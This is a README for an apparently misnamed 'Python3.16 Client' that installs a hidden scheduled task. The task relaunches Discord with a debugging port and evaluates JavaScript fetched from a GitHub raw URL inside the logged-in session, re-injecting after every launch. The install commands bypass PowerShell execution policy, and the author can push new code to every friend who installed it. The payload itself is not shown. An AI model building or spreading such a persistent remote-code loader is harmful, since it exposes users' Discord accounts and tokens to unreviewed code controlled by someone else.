# Python3.16 Client

Auto-attaches the Python3.16 client to Discord **at every launch**, with no BetterDiscord
and no manual console paste. It pulls `main.js` from this repo and evaluates it in the
Discord renderer through the Chrome DevTools Protocol.

## What it does

1. `install.ps1` copies the injector to `%LOCALAPPDATA%\Python316`.
2. It registers a scheduled task (`Python316 Injector`) that runs hidden at logon.
3. The injector:
   - launches Discord with `--remote-debugging-port=9222` (or relaunches it once if it
     was started without the port),
   - downloads the latest `main.js` from `raw.githubusercontent.com`,
   - connects to the page target over CDP and runs `Runtime.evaluate(main.js)`,
   - waits for the marker `window.__python316` before declaring success,
   - watches forever and re-injects after any Discord reload / update / relaunch.

Because `main.js` is fetched from the raw URL on every Discord start, pushing an update
here updates every friend on their next Discord launch.

## Install (for friends)

**Option A - one file**

1. Download `Setup.bat` (or the whole repo as ZIP).
2. Right-click `Setup.bat` -> Run. Approve the PowerShell prompt if Windows shows one.

**Option B - from a clone**

```powershell
git clone https://github.com/testkgj/python316-client
cd python316-client
powershell -NoProfile -ExecutionPolicy Bypass -File .\install.ps1
```

The first attach can restart Discord once, so save anything important. After that it is
silent.

## Options

```powershell
.\install.ps1 -NoStartNow     # install + schedule, do not touch the running Discord now
.\install.ps1 -NoTask         # skip scheduled task (use startup folder instead)
.\install.ps1 -RawBase "https://raw.githubusercontent.com/<you>/<repo>/main"
```

## Repo layout

| File | Purpose |
|------|---------|
| `main.js` | Canonical payload evaluated inside Discord (RPC, profile, forge, tools) |
| `payload.js` | Legacy v4.1.0 payload, kept for backward compatibility |
| `injector.ps1` | Persistent watcher: launch + fetch + CDP inject |
| `install.ps1` | One-time setup, registers the logon task |
| `uninstall.ps1` | Removes task, startup entry, install dir |
| `Setup.bat` | Double-click installer |
| `config.json` | Port, payload URL, launch/restart behaviour |
| `version.json` | Version + canonical payload URL |
| `deploy.ps1` | Pushes this folder to GitHub |

## Config

`%LOCALAPPDATA%\Python316\config.json`

```json
{
  "port": 9222,
  "githubRaw": "https://raw.githubusercontent.com/testkgj/python316-client/main/main.js",
  "autoLaunch": true,
  "restartExisting": true,
  "pollSeconds": 6
}
```

- `autoLaunch` - start Discord with the debug port when it is not running.
- `restartExisting` - relaunch Discord once if it was started without the port.
- `pollSeconds` - watcher interval.

## Logs

`%LOCALAPPDATA%\Python316\injector.log`

## Uninstall

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File .\uninstall.ps1
```

Then restart Discord.
